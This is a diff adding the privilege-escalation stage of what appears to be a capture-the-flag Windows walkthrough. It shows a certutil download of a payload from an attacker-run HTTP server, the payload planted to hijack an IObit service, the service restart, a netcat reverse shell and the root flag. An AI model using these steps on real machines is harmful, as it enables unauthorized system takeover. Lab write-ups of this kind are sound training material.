@@ -407,3 +407,116 @@ d----         9/26/2019  10:35 PM            IObit Uninstaller
 d----         9/26/2019   8:18 AM            LiveUpdate
 
 ```
+
+┌──(kali㉿kali)-[~] <br>
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... <br>
+
+PS > certutil -urlcache -f http://192.168.175.163:80/Advanced.exe Advanced.exe
+
+```
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+```
+
+```
+┌──(kali㉿kali)-[~] 
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.48.162.147 - - [11/Jul/2026 10:00:54] "GET /Advanced.exe HTTP/1.1" 200 -
+10.48.162.147 - - [11/Jul/2026 10:00:55] "GET /Advanced.exe HTTP/1.1" 200 -
+```
+PS > ls
+
+```
+    Directory: C:\Program Files (x86)\IObit
+
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+d----         7/11/2026   6:50 AM            Advanced SystemCare
+d----         9/26/2019  10:35 PM            IObit Uninstaller
+d----         9/26/2019   8:18 AM            LiveUpdate
+-a---         7/11/2026   7:00 AM      15872 Advanced.exe
+```
+Khoi dong lai metasploit <br>
+
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd C:\ <br>
+
+C:\>cd "Program Files (x86)" <br>
+
+C:\Program Files (x86)>cd IObit <br>
+
+C:\Program Files (x86)\IObit>sc stop AdvancedSystemCareService9
+
+```
+sc stop AdvancedSystemCareService9
+
+SERVICE_NAME: AdvancedSystemCareService9 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 4  RUNNING 
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+```
+
+C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
+
+```
+sc start AdvancedSystemCareService9
+
+SERVICE_NAME: AdvancedSystemCareService9 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 2  START_PENDING 
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 2912
+        FLAGS              : 
+```
+
+nc -vnlp 4443 
+
+```
+listening on [any] 4443 ...
+connect to [192.168.175.163] from (UNKNOWN) [10.48.162.147] 49347
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+```
+
+C:\Windows\system32>cd C:\Users\Administrator\Desktop <br>
+
+C:\Users\Administrator\Desktop>dir
+
+```
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2E4A-906A
+
+ Directory of C:\Users\Administrator\Desktop
+
+10/12/2020  12:05 PM    <DIR>          .
+10/12/2020  12:05 PM    <DIR>          ..
+10/12/2020  12:05 PM             1,528 activation.ps1
+09/27/2019  05:41 AM                32 root.txt
+               2 File(s)          1,560 bytes
+               2 Dir(s)  44,158,418,944 bytes free
+```
+
+C:\Users\Administrator\Desktop>more root.txt
+
+```
+more root.txt
+9af5f314f57607c00fd09803a587db80
+```
+
+
+
+
+
+
+
